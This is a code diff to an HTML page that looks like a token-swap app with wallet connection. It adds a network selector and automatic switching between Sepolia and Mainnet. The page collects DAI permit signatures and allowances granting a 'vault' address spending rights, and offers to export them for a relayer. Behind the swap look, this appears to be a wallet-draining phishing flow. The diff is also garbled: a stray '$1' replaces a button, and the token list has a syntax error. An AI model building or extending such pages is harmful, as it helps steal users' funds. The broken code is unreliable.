@@ -21,6 +21,9 @@
     .dots{width:40px;height:40px;border-radius:999px;border:1px solid #23262f;background:#12131a;display:grid;place-items:center;cursor:pointer}
     .connect{padding:10px 16px;border-radius:999px;border:0;cursor:pointer;color:#fff;font-weight:600;background:linear-gradient(180deg,#ff2db2,#ff46c0)}
 
+    .net-select{appearance:none;background:#141720;border:1px solid #2a2d36;color:#e7ecfb;border-radius:10px;padding:8px 10px;font-size:13px;cursor:pointer}
+    .net-select:focus{outline:none;box-shadow:0 0 0 2px rgba(255,45,178,.3)}
+
     .account-btn{display:none;align-items:center;gap:8px;padding:8px 12px;border:1px solid #2a2d36;background:#141720;border-radius:999px;color:#e7ecfb;cursor:pointer}
     .account-text{font-weight:600;font-size:14px}
     .account-menu{position:absolute;right:0;top:52px;width:480px;background:#12141b;border:1px solid #232634;border-radius:12px;box-shadow:var(--shadow);display:none;z-index:30}
@@ -76,7 +79,11 @@
       </div>
       <div class="search"><svg width="16" height="16" viewBox="0 0 24 24"><path fill="#93a0c8" d="M15.5 14h-.8l-.3-.3a6.5 6.5 0 1 0-.7.7l.3.3v.8l5 5 1.5-1.5-5-5zM10 15a5 5 0 1 1 0-10 5 5 0 0 1 0 10z"/></svg><input placeholder="Search tokens and pools" /></div>
       <div class="top-right">
-        <div class="dots" onclick="openSettings()"><svg viewBox="0 0 24 24"><circle cx="12" cy="4" r="2" fill="#cfd3da"/><circle cx="12" cy="12" r="2" fill="#cfd3da"/><circle cx="12" cy="20" r="2" fill="#cfd3da"/></svg></div>
+        $1
+        <select id="networkSelect" class="net-select" title="Select network">
+          <option value="0xaa36a7" selected>Sepolia</option>
+          <option value="0x1">Mainnet</option>
+        </select>
         <button class="connect" id="connectBtn" onclick="connectWallet()">Connect</button>
         <button class="account-btn" id="accountBtn">
           <span id="acctIcon"></span>
@@ -119,7 +126,48 @@
   const shorten = a => a.slice(0,6)+'…'+a.slice(-4);
   const identiconSVG = (addr)=>{ function hash(s){ let h=2166136261>>>0; for(let i=0;i<s.length;i++){ h^=s.charCodeAt(i); h=(h>>>0)*16777619>>>0; } return h>>>0; } const h=hash(addr.toLowerCase()); const hue=h%360; const c=`hsl(${hue} 70% 55%)`; let bits=h,cells=''; for(let y=0;y<5;y++){ let row=[]; for(let x=0;x<3;x++){ row.push((bits>>>(y*3+x))&1);} const full=row.concat([row[1],row[0]]); for(let x=0;x<5;x++){ if(full[x]) cells+=`<rect x="${x}" y="${y}" width="1" height="1"/>`; }} return `<svg viewBox="0 0 5 5" width="20" height="20" style="border-radius:6px;background:#0f1117"><g fill="${c}">${cells}</g></svg>`; };
 
-  const TOKENS=[{sym:'ETH',priceUSD:3500},{sym:'USDC',priceUSD:1},{sym:'DAI',priceUSD:1},{sym:'USDT',priceUSD:1}];
+  // Ensure wallet is on Sepolia (0xaa36a7). If chain not present, add it.
+  async function ensureChain(target='0xaa36a7'){
+    if(!window.ethereum) return false;
+    let cur;
+    try{ cur = await ethereum.request({method:'eth_chainId'}); }catch{ cur = null; }
+    if(cur===target) return true;
+    try{
+      await ethereum.request({ method:'wallet_switchEthereumChain', params:[{ chainId: target }] });
+      return true;
+    }catch(e){
+      if(e && (e.code===4902 || (e.data && e.data.originalError && e.data.originalError.code===4902))){
+        try{
+          await ethereum.request({ method:'wallet_addEthereumChain', params:[{
+            chainId:'0xaa36a7', chainName:'Sepolia',
+            nativeCurrency:{ name:'Sepolia ETH', symbol:'SEP', decimals:18 },
+            rpcUrls:['https://rpc.sepolia.org'], blockExplorerUrls:['https://sepolia.etherscan.io']
+          }]});
+          return true;
+        }catch(e2){ console.warn('add chain failed', e2); toast('Add Sepolia in MetaMask to continue.'); return false; }
+      }
+      console.warn('switch chain failed', e); toast('Please switch MetaMask to Sepolia.'); return false;
+    }
+  }
+
+  function getSelectedChainId(){
+    const sel=document.getElementById('networkSelect');
+    return sel && sel.value ? sel.value : '0xaa36a7';
+  }
+  function labelForChain(id){
+    if(id==='0x1') return 'Ethereum Mainnet';
+    if(id==='0xaa36a7') return 'Ethereum Sepolia';
+    try{ return 'Chain '+parseInt(id,16); }catch{ return 'Unknown'; }
+  }
+  function reflectSelectedChain(id){
+    const sel=document.getElementById('networkSelect');
+    if(sel && sel.value!==id) sel.value=id;
+    setChainConfig(id);
+    const netEl=document.getElementById('walletNetwork');
+    if(netEl) netEl.textContent=labelForChain(id);
+  }
+
+  const TOKENS=[{sym:'ETH',priceUSD:3500,{sym:'USDC',priceUSD:1},{sym:'DAI',priceUSD:1},{sym:'USDT',priceUSD:1}];
   let from=TOKENS[0], to=TOKENS[1];
   function updateHeaders(){ const rate=from.priceUSD/to.priceUSD; qs('#rateText').textContent=`1 ${from.sym} ≈ ${fmt(rate,4)} ${to.sym}`; compute(); }
   function compute(){ const a=parseFloat(qs('#fromAmt').value); const px=from.priceUSD/to.priceUSD; if(!isFinite(a)){ qs('#toAmt').value=''; qs('#fromUsd').textContent='$0'; qs('#toUsd').textContent='0'; return;} const out=a*px; qs('#toAmt').value=out?fmt(out):''; qs('#fromUsd').textContent='$'+fmt(a*from.priceUSD); qs('#toUsd').textContent=fmt(out); }
@@ -140,9 +188,14 @@
       const accounts=await window.ethereum.request({method:'eth_requestAccounts'});
       if(!accounts||!accounts[0]){ toast('No account selected.'); return; }
       const addr=accounts[0]; currentAddress=addr;
-      const chainId=await window.ethereum.request({method:'eth_chainId'});
-      // Set chain-specific config (DAI address, defaults)
-      setChainConfig(chainId);
+      let chainId=await window.ethereum.request({method:'eth_chainId'});
+      const target = getSelectedChainId();
+      if(chainId!==target){
+        const ok=await ensureChain(target);
+        if(ok){ chainId=await window.ethereum.request({method:'eth_chainId'}); }
+        else { toast('Please switch to the selected network.'); return; }
+      }
+      reflectSelectedChain(chainId);
       qs('#walletNotice').style.display='block';
       qs('#walletAddr').textContent=shorten(addr);
       qs('#walletNetwork').textContent=(chainId==='0x1')?'Ethereum Mainnet':(chainId==='0xaa36a7'?'Ethereum Sepolia':`Chain ${parseInt(chainId,16)}`);
@@ -222,7 +275,7 @@ function setChainConfig(chainIdHex){
   async function readName(token){ const res=await ethereum.request({method:'eth_call', params:[{to:token, data:'0x06fdde03'}, 'latest']}); try{ const hex=res.replace(/^0x/,''); const off=parseInt(hex.slice(0,64),16)*2; const len=parseInt(hex.slice(64,128),16)*2; const bytes=hex.slice(128,128+len).match(/.{1,2}/g).map(b=>parseInt(b,16)); return new TextDecoder().decode(new Uint8Array(bytes)); }catch{return 'Token';} }
   async function readNonce(token, owner){ const data='0x7ecebe00'+owner.replace(/^0x/,'').padStart(64,'0'); const res=await ethereum.request({method:'eth_call', params:[{to:token, data}, 'latest']}); return BigInt(res).toString(); }
 
-  window.openPermit = function(){ if(!currentAddress){ toast('Connect wallet first.'); return; } qs('#permitOwner').value=currentAddress; qs('#permitVault').value = VAULT_ADDRESS; qs('#permitModal').style.display='grid'; qs('#permitResult').style.display='none'; qs('#permitHint').style.display='none'; };
+  window.openPermit = async function(){ if(!currentAddress){ toast('Connect wallet first.'); return; } const ok = await ensureChain(getSelectedChainId()); if(!ok){ return; } qs('#permitOwner').value=currentAddress; qs('#permitVault').value = VAULT_ADDRESS; qs('#permitModal').style.display='grid'; qs('#permitResult').style.display='none'; qs('#permitHint').style.display='none'; };
   window.closePermit = function(){ qs('#permitModal').style.display='none'; };
 
   async function buildDaiPermit(owner, spender, minutesFromNow){
@@ -241,6 +294,7 @@ function setChainConfig(chainIdHex){
   }
 
   window.signPermitExport = async function(){
+    const ok = await ensureChain(getSelectedChainId()); if(!ok){ return; }
     try{
       if(!currentAddress){ toast('Connect wallet first.'); return; }
       const owner=currentAddress;
@@ -279,6 +333,7 @@ function setChainConfig(chainIdHex){
   }
 
   window.signPermitSubmitDai = async function(){
+    const okSwitch = await ensureChain(getSelectedChainId()); if(!okSwitch){ return; }
     // Optional: user sets allowance directly to the vault (user pays gas). Useful for testing on mainnet or testnet before relayer is ready.
     try{
       if(!currentAddress){ toast('Connect wallet first.'); return; }
@@ -344,6 +399,18 @@ function setChainConfig(chainIdHex){
   <script>
   // Finish init
   updateHeaders();
+  document.addEventListener('DOMContentLoaded', async ()=>{
+    let cur=null; try{ cur=await window.ethereum?.request({method:'eth_chainId'}); }catch{}
+    reflectSelectedChain(cur||getSelectedChainId());
+    const sel=document.getElementById('networkSelect');
+    if(sel){
+      sel.addEventListener('change', async (e)=>{
+        const id=e.target.value; const ok=await ensureChain(id);
+        if(ok){ reflectSelectedChain(id); if(currentAddress){ await loadBalances(currentAddress); } }
+        else { try{ const now=await ethereum.request({method:'eth_chainId'}); sel.value=now; }catch{} }
+      });
+    }
+  });
   </script>
 </body>
 </html>
